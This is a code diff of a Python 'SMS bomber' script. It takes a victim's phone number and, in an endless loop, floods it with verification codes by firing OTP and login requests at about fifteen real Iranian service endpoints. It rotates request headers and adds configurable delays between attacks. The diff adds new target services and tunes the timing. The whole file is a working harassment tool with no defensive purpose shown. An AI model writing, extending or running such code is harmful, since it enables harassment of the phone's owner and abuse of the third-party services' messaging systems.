@@ -3,63 +3,79 @@ import random
 import time
 
 #########################
-Green="\033[1;33m"
 Blue="\033[1;34m"
+Red="\033[1;31m"
+Green="\033[1;33m"
+pink = "\033[95m"
 Grey="\033[1;30m"
 Reset="\033[0m"
-Red="\033[1;31m"
 cyan = "\033[36m"
-pink = "\033[95m"
 purple = "\033[35m"
 #########################
 
-
 number = input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "number" + cyan + "]─[" + Green + "(937.........) :" + cyan + "]" + Red + ": " + Reset)
-attack_speed = float(input("Enter attack speed in seconds: "))
 
-url_divar = "	https://api.divar.ir/v5/auth/authenticate"
-json_divar = {"phone":number}
+attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))
 
-url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
-json_snapp = {"cellphone":"+98" + number}
+sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))
 
-url_sheypoor= "https://www.sheypoor.com/api/v10.0.0/auth/send"
-json_sheypoor= {"username":"0" + number}
+def data(number):
+    url_divar = "https://api.divar.ir/v5/auth/authenticate"
+    json_divar = {"phone":number}
 
-url_jet= "https://api.digikalajet.ir/user/login-register/"
-json_jet= {"phone":"0" + number}
+    url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
+    json_snapp = {"cellphone":"+98" + number}
 
-url_virgool= "https://virgool.io/api/v1.4/auth/verify"
-json_virgool= {"method":"phone","identifier":"+98" + number}
+    url_sheypoor= "https://www.sheypoor.com/api/v10.0.0/auth/send"
+    json_sheypoor= {"username":"0" + number}
 
-url_snapp_box= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
-json_snapp_box= {"phoneNumber":"0" + number}
+    url_jet= "https://api.digikalajet.ir/user/login-register/"
+    json_jet= {"phone":"0" + number}
+
+    url_virgool= "https://virgool.io/api/v1.4/auth/verify"
+    json_virgool= {"method":"phone","identifier":"+98" + number}
+
+    url_snapp_box= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
+    json_snapp_box= {"phoneNumber":"0" + number}
 
 
-url_banimode = "https://mobapi.banimode.com/api/v2/auth/request"
-json_banimode = {"phone": "0" + number}
+    url_banimode = "https://mobapi.banimode.com/api/v2/auth/request"
+    json_banimode = {"phone": "0" + number}
 
-url_ostadkr = "https://api.ostadkr.com/login"
-json_ostadkr = {"mobile": "0" + number}
+    url_ostadkr = "https://api.ostadkr.com/login"
+    json_ostadkr = {"mobile": "0" + number}
 
-url_drnext = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
-json_drnext = {"mobile": "0" + number}
+    url_drnext = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
+    json_drnext = {"mobile": "0" + number}
 
-url_snapp = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}"
+    url_snapp = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}"
 
-url_basalam = "https://auth.basalam.com/otp-request"
-json_basalam = {
+    url_basalam = "https://auth.basalam.com/otp-request"
+    json_basalam = {
 	"client_id": 11,
     "mobile": "0"+number}
 
-url_pinorest = "https://api.pinorest.com/frontend/auth/login/mobile"
-json_pinorest = {"mobile": "0"+number}
+    url_buskool = "https://www.buskool.com/send_verification_code"
+    json_buskool = {"phone": "0" + number}
 
-url_buskool = "https://www.buskool.com/send_verification_code"
-json_buskool = {"phone": "0" + number}
+    url_jabama = "https://taraazws.jabama.com/api/v4/account/send-code"
+    json_jabama = {"mobile": "0" + number}
 
-url_jabama = "https://taraazws.jabama.com/api/v4/account/send-code"
-json_jabama = {"mobile": "0" + number}
+    url_alibaba = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
+    json_alibaba = {"phoneNumber": "0"+number}
+
+
+    url_digitoon = "https://apitwo.digitoon.ir/mobile_login_step1/8?dg_id=99E3A80D%2C99E3A80D"
+    json_digitoon = {
+        "device_id": "desktop",
+        "device_model": "browser-none-none-Firefox-112",
+        "device_os": "NextJS-10-Windows",
+        "mobile": "0"+number
+    }
+    
+    return url_divar,json_divar,url_snapp,json_snapp,url_sheypoor,json_sheypoor,url_jet,json_jet,url_virgool,json_virgool,url_snapp_box,json_snapp_box,url_banimode,json_banimode,url_ostadkr,json_ostadkr,url_drnext,json_drnext,url_basalam,json_basalam,url_buskool,json_buskool,url_jabama,json_jabama,url_alibaba,json_alibaba,url_digitoon,json_digitoon
+
+url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon = data(number)
 
 
 
@@ -100,32 +116,78 @@ while True:
     random_head = random.choice(heads)
 
     req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
-    print("divar",req_divar)
-    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
-    print("snapp",req_snapp)
-    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
-    print("sheypoor",req_sheypoor)
-    req_jet = requests.post(url= url_jet,json=json_jet,headers=random_head)
-    print("jet",req_jet)
-    req_virgool = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
-    print("virgool",req_virgool)
-    req_snapp_box = requests.post(url= url_snapp_box,json=json_snapp_box,headers=random_head)
-    print("snapp_box",req_snapp_box)
-    req_banimode = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
-    print("banimode",req_banimode)
-    req_ostadkr = requests.post(url=url_ostadkr,json=json_ostadkr,headers=random_head)
-    print("ostadkr",req_ostadkr)
-    req_drnext = requests.post(url=url_drnext,json=json_drnext,headers=random_head)
-    print("drnext",req_drnext)
-    req_snapp_market = requests.post(url_snapp,data=number,headers=random_head)
-    print("test",req_snapp_market)
-    req_basalam = requests.post(url= url_basalam,json=json_basalam,headers=random_head)
-    print("basalam",req_basalam)
-    req_pinorest = requests.post(url= url_pinorest,json=json_pinorest,headers=random_head)
-    print("pinorest",req_pinorest)
-    req_buskool = requests.post(url= url_buskool,json=json_buskool,headers=random_head)
-    print("buskool",req_buskool)
-    req_jabama = requests.post(url= url_jabama,json=json_jabama,headers=random_head)
-    print("jabama",req_jabama)
+    print("1-divar",req_divar)
+    time.sleep(sleep_time)
 
+    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
+    print("2-snapp",req_snapp)
+    time.sleep(sleep_time)
+
+    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
+    print("3-sheypoor",req_sheypoor)
+    time.sleep(sleep_time)
+
+    req_jet = requests.post(url= url_jet,json=json_jet,headers=random_head)
+    print("4-jet",req_jet)
+    time.sleep(sleep_time)
+
+    req_virgool = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
+    print("5-virgool",req_virgool)
+    time.sleep(sleep_time)
+
+    req_snapp_box = requests.post(url= url_snapp_box,json=json_snapp_box,headers=random_head)
+    print("6-snapp_box",req_snapp_box)
+    time.sleep(sleep_time)
+
+    req_banimode = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
+    print("7-banimode",req_banimode)
+    time.sleep(sleep_time)
+
+    req_ostadkr = requests.post(url=url_ostadkr,json=json_ostadkr,headers=random_head)
+    print("8-ostadkr",req_ostadkr)
+    time.sleep(sleep_time)
+
+    req_drnext = requests.post(url=url_drnext,json=json_drnext,headers=random_head)
+    print("9-drnext",req_drnext)
+    time.sleep(sleep_time)
+
+    req_snapp_market = requests.post(url_snapp,data=number,headers=random_head)
+    print("10-snapp_market",req_snapp_market)
+    time.sleep(sleep_time)
+
+    req_basalam = requests.post(url= url_basalam,json=json_basalam,headers=random_head)
+    print("11-basalam",req_basalam)
+    time.sleep(sleep_time)
+
+    req_buskool = requests.post(url= url_buskool,json=json_buskool,headers=random_head)
+    print("12-buskool",req_buskool)
+    time.sleep(sleep_time)
+
+    req_jabama = requests.post(url= url_jabama,json=json_jabama,headers=random_head)
+    print("13-jabama",req_jabama)
+    time.sleep(sleep_time)
+
+    req_alibaba = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
+    print("14-alibaba",req_alibaba)
+    time.sleep(sleep_time)
+
+    req_digitoon = requests.post(url=url_digitoon,json=json_digitoon,headers=random_head)
+    print("15-Digoon",req_digitoon)
+    time.sleep(sleep_time)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    print(Blue + "Send all requests")
     time.sleep(attack_speed)
